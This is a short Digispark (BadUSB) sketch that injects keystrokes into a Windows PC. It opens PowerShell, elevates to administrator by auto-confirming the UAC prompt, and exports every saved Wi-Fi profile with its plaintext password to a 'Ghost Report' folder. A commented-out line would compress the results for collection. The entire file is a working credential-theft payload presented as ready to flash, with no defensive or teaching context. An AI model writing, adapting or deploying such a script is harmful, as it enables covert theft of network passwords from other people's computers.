/*
* Author: Ecthor Silva
* Description: 
*/

#include "DigiKeyboardPtBr.h"

void setup(){
  //empity
}

void loop(){
  DigiKeyboardPtBr.sendKeyStroke(0);
  DigiKeyboardPtBr.sendKeyStroke(KEY_R, MOD_GUI_LEFT); 
  DigiKeyboardPtBr.delay(1000);
  DigiKeyboardPtBr.print("powershell");
  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
  DigiKeyboardPtBr.delay(1000);
  DigiKeyboardPtBr.print("powershell Start-Process powershell -Verb runAs; exit");
  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
  DigiKeyboardPtBr.delay(1000);
  DigiKeyboardPtBr.sendKeyStroke(KEY_Y, MOD_ALT_LEFT); // Alt + Y
  DigiKeyboardPtBr.delay(1000);
  DigiKeyboardPtBr.print("Start-Service -Name 'wlansvc'");
  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
  DigiKeyboardPtBr.delay(1000);
  DigiKeyboardPtBr.print("$folderDateTime = (get-date).ToString('d-M-y HHmmss');");
  DigiKeyboardPtBr.print("$userDir = (Get-ChildItem env:\\userprofile).value + '\\Ghost Report ' + $folderDateTime;");
  DigiKeyboardPtBr.print("$fileSaveDir = New-Item ($userDir) -ItemType Directory;");
  DigiKeyboardPtBr.print("$date = get-date;");
  DigiKeyboardPtBr.print("netsh wlan export profile key=clear folder=$fileSaveDir; exit");
  // DigiKeyboardPtBr.print("Compress-Archive -Path $fileSaveDir -DestinationPath '$env:USERPROFILE\ResultsPassword.zip';");
  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);

  for (;;){/*empty*/}
}